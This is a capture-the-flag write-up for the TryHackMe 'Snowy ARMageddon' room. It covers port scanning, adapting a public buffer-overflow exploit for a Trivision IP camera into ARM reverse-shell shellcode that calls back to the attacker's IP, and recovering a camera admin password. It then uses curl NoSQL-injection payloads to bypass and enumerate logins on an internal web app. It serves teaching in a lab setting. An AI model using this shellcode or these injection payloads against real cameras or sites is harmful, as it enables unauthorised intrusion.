![image](https://github.com/beta-j/TryHackMe-Rooms/assets/60655500/9526e3dc-8779-413e-8289-fca77aaed65f)


# Snowy ARMageddon #
### https://tryhackme.com/room/armageddon2r ###

#  
### CONTENTS : ###
[TL;DR](#tldr-)

[PROCEDURE](#procedure)

-  [Part 1 - Port Scanning and Enumeration](#part-1---port-scanning-and-enumeration)
    
-  [Part 2 - Modifying Assembly Code and Obtaining Reverse Shell](#part-2---modifying-assembly-code-and-obtaining-reverse-shell)
    
-  [Part 3 - Decrypting and Analysing WiFi Traffic](#part-3---decrypting-and-analysing-wifi-traffic)
    
-  [Part 4 - Decrypting and Replaying a RDP Session](#part-4---decrypting-and-replaying-a-rdp-session)



### TL;DR : ###
-  Scan the Victim IP to determine open ports on 8080 and 50628
-  Find and modify an exploit (including some assembly code) to establish a revers shell to an IP Camera
-  Pivot from the IP camera to an internal-only web application by using NoSQLi
#   

>Your main target? Access that internal-only web application. That's where the juicy stuff is hidden. Now, gettin' full privileges on the machine – that's a tasty bonus, but don't sweat it if it's out of reach. The key is to complete the mission without kickin' up a snowstorm.

>Remember, this is all about bein' as silent as the falling snow and as cunning as the arctic fox. Ready? Let's dive into this digital blizzard and show 'em what the Bandit Yeti's made of!

This room was included as one of the sidequests for the TryHackMe Advent of Cyber 2023.  We are given a target machine IP address which for the sake of this writeup will be **Victim IP: `10.10.106.239`**

**NOTE :** Passwords, hashes and flags are redacted in this document.  If you'd like to know the answers simply go to the [TryHackMe Room](https://tryhackme.com/room/armageddon2r) and follow the steps - it's free 😄

>What is the content of the first flag?
>
>What is the content of the `yetikey2.txt` file?
>


## Procedure ##

### Part 1 - Port Scanning and Enumeration ###

Start with a `nmap` scan with the `-sS` switch and go have a coffee while it runs.
The `-sS` switch asks `nmap` to perform a `SYN Stealth scan` which is a relatively stealthy (remember that we are told that stealth is important in this challenge) and quick scan.  A `SYN Stealth scan` never opens a full TCP connection and instead relies on sending  `SYN` packets and waiting for a `SYN/ACK` or `RST` responses.
```
sudo nmap -sS -p1-65335 10.10.106.239
```
**_NOTE:_** You may also use `rustscan -a 10.10.106.239` which yields _MUCH_ quicker portscan results - but honestly I don't know how it compares to NMAP with -sS in terms of 'noisieness'.

```
Starting Nmap 7.60 ( https://nmap.org ) at 2024-01-15 09:02 GMT
Nmap scan report for ip-10-10-200-123.eu-west-1.compute.internal (10.10.106.239)
Host is up (0.00029s latency).

PORT      STATE SERVICE
22/tcp    open  ssh
23/tcp    open  telnet
8080/tcp  open  http-proxy
50628/tcp open  unknown
MAC Address: 02:5F:E1:66:EA:0B (Unknown)
```

From the scan results we can see four open ports:
  -  Port `22` for SHH
  - Port `23` for Telnet
  - Port `8080` (most probably a website)
  - Port `50628` - an unusual port number

Connecting via SSH is not possible and we get a `Permission denied (publickey)` error.   Attempting to connect via Telnet successfully establishes a connection which is immediately terminated by the host, and since we don't know anything about port `50628` so far, we're going to ignore it for the time being.

This leaves us with port `8080` and we can just open a browser and navigate to `http://10.10.106.239:8080/` to bring up a website with an angry-looking elf:

![Angry looking elf](https://github.com/beta-j/TryHackMe-Rooms/assets/60655500/5bd4056d-ed64-4416-9d99-a81154c8fa3e)

This must be the **"internal-only web application"** that is our main target.  But as the name implies - it appears to only be accessible from the internal network, so we need to figure out a way in first.

Let's have a look at port `50628` next - maybe we can access it through the browser too by navigating to `http://10.10.106.239:50628` ?  Yup, it brings up a login page for a **Trivision NC-227WF HD 720P** IP Network camera:

![Trivision Dashboard](https://github.com/beta-j/TryHackMe-Rooms/assets/60655500/13c1fc4f-a870-44b9-80a0-f95748667583)


### Part 2 - Modifying Assembly Code and Obtaining Reverse Shell ###

Some Google searching for `Trivision NC-227WF Exploit` quickly leads us to the following article: [(https://no-sec.net/arm-x-challenge-breaking-the-webs/)](https://no-sec.net/arm-x-challenge-breaking-the-webs/) and just by looking at the title it is evident that we're dealing with an ARM processor architecture (and the `ARMageddon` in the challenge title is making more sense now).

The article explains how a buffer overflow vulnerability in the Trivision camera firmware can be exploited to establish a reverse shell connection.  It conveniently also provides [assembly code instructions](code/Snowy_ARMageddon/original_assembly_instructions.asm) and a [python script](code/Snowy_ARMageddon/original_exploit.py) to exploit this.

The Python code includes the `HOST`, `LHOST` variables that need to be updated with the Camera IP address and Localhost IP address respectively. 
```
HOST = '10.10.106.239'
PORT = 50628
LHOST = [10,10,52,204]
LPORT = 4444
```

The code then declares a variable called `BADCHARS` - this contains a set of hex values that we cannot pass on to the device.... these will come into play in a short while...
```
BADCHARS = b'\x00\x09\x0a\x0d\x20\x23\x26'  # Equivalent to decimal values: 0, 9, 10, 13, 32, 35 and 38 
```

There is also a line towards the end of the script that needs to be updated with the IP Camera's address:
```
s = remote('10.10.106.239', 50628)
```

Now comes the interesting bit...  The Python script includes a block of code that passes assembly instructions in the form of hex byte strings.  This includes our machine's local IP address hard-coded into the hex byte strings which will be used to establish the reverse shell.  Luckily for us, the inline documentation conviently indicates which line is tackling this and we also have the assembly code corresponding to it:
```
SC += b'\x59\x1f\xa0\xe3\x01\x14\xa0\xe1\xa8\x10\x81\xe2\x01\x14\xa0\xe1\xc0\x10\x81\xe2\x04\x10\x2d\xe5'   # 192.168.100.1
```
```
/* ADDR */
mov r1, #0x164
lsl r1, #8
add r1, #0xa8
lsl r1, #8
add r1, #0xc0
push {r1}       // 192.168.100.1
```

If you're reading this and are anything like myself - you probably just experienced an involuntary inner *groan* at the site of assembly code 😞...  but please stay with me for a while longer and I hope to demystify this code block for you.

First of all, we can use a Dis/Assembler like https://shell-storm.org/online/Online-Assembler-and-Disassembler/ to convert between assembly instructions and the equivalent hex values that represent it.  This tool will come in useful as we work out how to replace the hex byte string with one containing our local machine's IP address.  It is also worth keeping in mind that ARM uses a little-endian system which essentially means that the octets of the IP address are stored in reverse order, eg. `192.168.100.1` is stored as `1.100.168.192`.

So what's going on with the assembly instructions storing the IP address value of `192.168.100.1`?:
-  Move 0x164 to register R1 (i.e. $356$ in decimal)
-  Shift the register left by eight bits (i.e. perform $356 * 256 = 91136$)
-  Add 0xA8 to R1 (i.e. perform $91136 + 168 = 91304$)
-  Shift the register left by eight bits (i.e. perform $91304 * 256 = 23373824$)
-  Add 0xC0 to R1 (i.e. perform $23373824 + 192 = 23374016$)

So now we have value of **`23374016`** (decimal) stored in register R1.  If we convert this to a 32-bit binary and divide it into octets (i.e. groups of 8 bits each) we get: **`00000001.01100100.10101000.11000000`**, and if we convert this back to decimal we will get: **`1.100.168.192`** - which is the little-endian representation of the IP address we were looking to store.

If you've managed to follow my reasoning this far, it should be clear that we are taking the little-endian representation of the IP address, converting it to decimal and then storing appropriate hex values to register R1 and shifting by 8 bits to the left for each octet to represent this.  In our case this is complicated a bit further by the fact that we have to avoid the hex values defined in the `BADCHARS` variable which include the hex equiavelent value for `10` and - of course- TryHackMe Attackboxes always have an IP address starting with `10.10`!

Now that we've understood how this works, we can craft our own hex byte string that points back to our local machine IP address - in our case this will be `10.10.52.240`.

```
/* ADDR */
mov r1, #0xf0   // store '240' in R1
lsl r1, #8      // shift by 8 bits to the left
add r1, #0x34   // add '52' to R1
lsl r1, #8      // shift by 8 bits to the left
add r1, #0x08   // add '8' and '2' to R1 (since we cannot pass the hex value for 10; '0x0a')
add r1, #0x02
lsl r1, #8      // shift by 8 bits to the left
add r1, #0x08   // add '8' and '2' to R1 (since we cannot pass the hex value for 10; '0x0a')
add r1, #0x02
push {r1}       
```
Now we can simply copy this set of instructions to the assembler and convert it to a hex string that we can paste into the Python Script:
_(Make sure to select `ARM` for the processor type and to copy the Little Endian output)_
![image](https://github.com/beta-j/TryHackMe-Rooms/assets/60655500/e90c2569-f13d-42d5-8eb3-3b0ecacc003c)

You can follow [THIS LINK](https://shell-storm.org/online/Online-Assembler-and-Disassembler/?inst=mov+r1%2C+%230xf0++%0D%0Alsl+r1%2C+%238++++%0D%0Aadd+r1%2C+%230x34+++%0D%0Alsl+r1%2C+%238++++++%0D%0Aadd+r1%2C+%230x08+++%0D%0Aadd+r1%2C+%230x02%0D%0Alsl+r1%2C+%238++++++%0D%0Aadd+r1%2C+%230x08+++%0D%0Aadd+r1%2C+%230x02++++%0D%0Apush+%7Br1%7D++&arch=arm&as_format=inline#assembly) and simply change the `#0xf0` and `#0x34` values to correspond to your IP address - but remember to avoid using any *bad characters*!

So we can now update the python script with the new byte string we generated:
```
"\xf0\x10\xa0\xe3\x01\x14\xa0\xe1\x34\x10\x81\xe2\x01\x14\xa0\xe1\x08\x10\x81\xe2\x02\x10\x81\xe2\x01\x14\xa0\xe1\x08\x10\x81\xe2\x02\x10\x81\xe2\x04\x10\x2d\xe5"
```

[You may have a look at the update python code here](code/Snowy_ARMageddon/modified_exploit.py).

Just by running the `modified_exploit.py` we get a reverse shell connection to the IP Camera :)

![image](https://github.com/beta-j/TryHackMe-Rooms/assets/60655500/c407311b-5deb-4533-95e3-7cc1a944a6ea)

Now that we're in we can have a look at the contents of the root folder and we can notice that thee is a hidden folder called `.emux`.

```
$ ls -la
drwxr-xr-x   14 1000     1000          4096 Dec  4  2023 .
drwxr-xr-x   14 1000     1000          4096 Dec  4  2023 ..
drwxr-xr-x    2 root     root          4096 Jan 16  2024 .emux
drwxr-xr-x    2 1000     1000          4096 Dec 17  2023 bin
drwxr-xr-x    2 1000     1000          4096 Jan 16  2024 dev
drwxr-xr-x   15 1000     1000          4096 Dec  4  2023 etc
drwxr-xr-x    4 1000     1000          4096 Feb  6  2017 home
drwxr-xr-x    3 1000     1000          4096 Feb  6  2017 lib
dr-xr-xr-x   77 root     root             0 Dec 31 19:00 proc
drwxr-xr-x    2 1000     1000          4096 Dec 17  2023 root
drwxr-xr-x    2 1000     1000          4096 Feb  6  2017 sbin
drwxr-xr-x   12 root     root             0 Dec 31 19:00 sys
lrwxrwxrwx    1 1000     1000             8 Feb  6  2017 tmp -> /var/tmp
drwxr-xr-x    4 1000     1000          4096 Feb  6  2017 usr
drwxr-xr-x   13 1000     1000          4096 Jan 16  2024 var
```

Naturally we're drawn to the hidden folder first and looking inside that we can see a hidden file called `.nfs00000000000fa3a300000001`.
```
$ cd .emux
$ ls -la
drwxr-xr-x    2 root     root          4096 Jan 16  2024 .
drwxr-xr-x   14 1000     1000          4096 Dec  4  2023 ..
-rwxr-xr-x    1 root     root           169 Jan 16  2024 .nfs00000000000fa3a300000001
```

The contents of the hidden file appear to be a bash script updating the contents of `/var/etc/umconfig.txt' with a new admin password.
```
$ cat .nfs00000000000fa3a300000001
#!/bin/sh
rm -f /dev/abs628
touch /dev/abs628
/etc/init.d/rc.sysinit
sed -i 's/password=admin/password=Y3tiStarCur!ous&/' /var/etc/umconfig.txt
/etc/init.d/rc 3
/bin/sh
```

Looking inside `umconfig.txt`, we see a lot of data, but at the very top we can see a username `admin` and a password that got a bit messed up due to a mistake in the bash script we just looked at which prepended (instead of replacing) the old password with the new one.
```
$ cat /var/etc/umconfig.txt
TABLE=users

ROW=0
name=admin
password=Y3*******r!ouspassword=admin
group=administrators
prot=0
disable=0

TABLE=groups

ROW=0
...
...

```

With this username / password combination in hand we can now head back to the browser and log in to the camera's web interface, where we are greeted by the first flag for this challenge.

![image](https://github.com/beta-j/TryHackMe-Rooms/assets/60655500/b9060a2e-bc9a-4221-be0a-fef6d4a222e7)



Now that we are on the inside of the work (running off the IP Camera's firmware), it's worth trying to see whether the **"internal-only web application"** is now accessible to us:
```
$ curl http://10.10.106.239:8080
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   461  100   461    0     0   5971      0 --:--:-- --:--:-- --:--:--  6681
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>401 Unauthorized</title>
</head><body>curl
<h1>Unauthorized</h1>
<p>This server could not verify that you
are authorized to access the document
requested.  Either you supplied the wrong
credentials (e.g., bad password), or your
browser doesn't understand how to supply
the credentials required.</p>
<hr>
<address>Apache/2.4.57 (Debian) Server at 10.10.106.239 Port 8080</address>
</body></html>
```

We are served a page saying that the server is expecting us to supply credentials to access it, so perhaps we can try passing the credentials we just retrieved for the camera dashboard:
```
curl -u 'admin:Y3<R E D A C T E D>n' -s http://10.10.106.239:8080/
<br />
<b>Warning</b>:  Undefined array key "user" in <b>/var/www/html/index.php</b> on line <b>19</b><br />
<!DOCTYPE html>
<html lang="en" class="h-full bg-thm-800">

<head>
  <meta charset="UTF-8" />
  <link rel="icon" type="image/png" href="https://assets.tryhackme.com/img/favicon.png" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>TryHackMe | Cyber Police Dashboard</title>
  <link rel="stylesheet" href="styles.css" />
</head>
```
This still throws up an error, but if we add the `-L` switch to `curl` it wll follow website redirects and this time we get a different result:
```
$ curl -u 'admin:Y3<R E D A C T E D>d=admin' -s http://10.10.106.239:8080 -L

<!DOCTYPE html>
<html lang="en" class="h-full bg-thm-900">

<head>
  <meta charset="UTF-8" />
  <link rel="icon" type="image/png" href="https://assets.tryhackme.com/img/favicon.png" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>TryHackMe</title>
  <link rel="stylesheet" href="styles.css" />
</head>
...
...
<div class="mt-10 sm:mx-auto sm:w-full sm:max-w-[480px]">
      <div class="bg-thm-600 px-6 py-12 shadow-lg shadow-black/40 sm:rounded-lg sm:px-12">
        <form class="space-y-6" action="#" method="POST">
          <div>
            <label for="username" class="block text-sm font-medium leading-6 text-gray-100">Username</label>
            <div class="mt-2">
              <input id="username" name="username" type="text" required class="block w-full rounded-md border-0 py-1.5 text-gray-900 shadow-sm ring-1 ring-inset ring-gray-300 placeholder:text-gray-400 focus:ring-2 focuxt-sm font-medium leading-6 text-gray-100">Password</label>
            <div class="mt-2">
              <input id="password" name="password" type="password" autocomplete="current-password" required class="block w-full rounded-md border-0 py-1.5 text-gray-900 shadow-sm ring-1 ring-inset ring-gray-300 placeholder:text-gray-400 focus:ring-2 focus:ring-inset focus:ring-thm-600 sm:text-sm sm:leading-6">
            </div>
          </div>

          <div>
            <button type="submit" class="flex w-full justify-center rounded-md bg-green-500 px-3 py-1.5 text-sm font-semibold leading-6 uppercase text-thm-800 shadow-sm hover:bg-green-400 focus-visible:outline focus-visible:outline-2 focus-visible:outline-offset-2 focus-visible:outline-green-600">Sign in</button>
          </div>
        </form>

        <!-- Error message -->
              </div>
...
...
...
```

From this output we can tell that the site is expecting us to pass a username and password and just by trying the most common page name and entering `curl http://10.10.106.239:8080/login.php` we are served with the exact page, so we now know where we were being redirected too and which page is expecting us to pass it a username and password 

Let's try and re-write our `curl` command to pass on our username and password to `login.php`.  We also add a `-c` switch to save any cookies served by the page:

```
$ curl -s -u 'admin:Y3<R E D A C T E D>n' http://10.10.106.239:8080/login.php -X POST -d 'username=admin&password=Y3<R E D A C T E D>n' -c cookie -L
```
This time we get a response telling us that the username or password are incorrect:
```
        <!-- Error message -->
                  <p class="py-4 mt-3 text-center bg-thm-900 text-sm text-red-500 border rounded-md border-red-500">
            Invalid username or password          </p>
              </div>
```

Well what to do next - we can send data to the server for processing but we don't seem to have the proper username and password that we need to use.  What followed here was a lot of trial and error and going round in circles until I decided to try some NoSQLi techniques - I used the following as a great refernce to get started: https://book.hacktricks.xyz/pentesting-web/nosql-injection

The following `curl` command effictively matches to the first user in the database that has a non-null username and password:

```
$ curl -s -u 'admin:Y3<R E D A C T E D>n' http://10.10.106.239:8080/login.php -X POST -d 'username[$exists]=true&password[$exists]=true' -c cookie.txt -L
```

And it works!  we're now presented with a different HTML which includes the message **Welcome Frostbite**.

``` 
<!DOCTYPE html>
<html lang="en" class="h-full bg-thm-800">

...

    </div>
      </div>
    </nav>

    <div class="">
      <header>
        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8 bg-thm-800">
          <h1 class="text-3xl font-bold leading-tight text-center text-gray-100 ">Welcome Frostbite!</h1>
                  </div>
      </header>

...
```
It would appear that the first username in the database is `Frostbite` but his dashboard is mostly empty and we have no useful information, so maybe we can start looking into what other usernames are available and what they have on their dashboard.

To do this I modified the `curl` command I used earlier to now exclude the username `Frostbite` and match on the next available one:

```
curl -u 'admin:Y3<R E D A C T E D>n' -s http://10.10.106.239:8080/login.php -X POST -d 'username[$nin][0]=Frostbite&password[$regex]=.*' -L -c cookie
```

This time we see the message **Welcome `Snowballer`**, but again not much else.  

What comes next is a painstaking bit of repetitive trial and error which probably could have been automated but I would then have had to figure out how to break out of the shell on the IP camera or extablish some kind of proxy - which I couldn't be bothered with.

I kept adding each new username I found to the `curl` command as yet another name to be excluded.  To keep thigns more manageable I added the switch `-w 'Size: %{size_download}\n` to the command so that I could easily see if there was a significant change in the size of the retrieved data from one username to the next.  I also added a `| grep -e Welcome -e Size` so that for each new `curl` command I tried I would only get an output showing the Welcome message with the newly discovered username and the size of the retrieved data.

Finally after 18 iterations of the `curl` command I enumarted the following usernames:
```
Frostbite
Snowballer
Slushinski
Blizzardson
Tinseltooth
Snowbacca
Grinchowski
Scroogestein
Sleighburn
Northpolinsky
Frostington
Tinselova
Frostova
Iciclevich
Frostopoulos
Grinchenko
Snownandez
Frosteau
```
It was not possible to retrieve any further usernames, so I am assuming that this list is comprehensive, but nevertheless the `curl` request that returned `Frosteau` had a significantly larger file size - so that is most probably the user we should be looking at.

The final curl command I used was:

```
curl -u 'admin:Y3<R E D A C T E D>n' -s http://10.10.106.239:8080/login.php -X POST -d 'username[$nin][0]=Frostbite&username[$nin][1]=Snowballer&username[$nin][2]=Slushinski&username[$nin][3]=Blizzardson&username[$nin][4]=Tinseltooth&username[$nin][5]=Snowbacca&username[$nin][6]=Grinchowski&username[$nin][7]=Scroogestein&username[$nin][8]=Sleighburn&username[$nin][9]=Northpolinsky&username[$nin][10]=Frostington&username[$nin][11]=Tinselova&username[$nin][12]=Frostova&username[$nin][13]=Iciclevich&username[$nin][14]=Frostopoulos&username[$nin][15]=Grinchenko&username[$nin][16]=Snownandez&password[$exists]=true' -L -c cookie -w 'Size: %{size_download}\n' | grep -e Welcome -e Size
```

Which gave me the following output:
```
<h1 class="text-3xl font-bold leading-tight text-center text-gray-100 ">Welcome Frosteau!</h1>
Size: 13899
```


And now that we know that we're interested in retrieving `Frosteau`'s dashboard we can clean up this `curl` command to the following:
```
curl -u 'admin:Y3<R E D A C T E D>n' -s http://10.10.106.239:8080/login.php -X POST -d 'username=Frosteau&password[$exists]=true' -L -c cookie 
```

Finally we are served `Frosteau`'s dashboard which - luckily for us - includes the contents of `yetikey2.txt` in cleartext in his 'Important Notes' section

![image](https://github.com/beta-j/TryHackMe-Rooms/assets/60655500/2689690b-8ea5-4594-80c2-9e2e36f0a32e)

I copied the html output and pasted it to a blank document on my local machine for a better-looking formatted output:

![image](https://github.com/beta-j/TryHackMe-Rooms/assets/60655500/b450a6e4-c0fe-41be-afeb-448e69629909)

And right there at the bottom there is a list of usernames which took me oh so long to retrieve!  I wonder if there was a way of getting to that list earlier on!
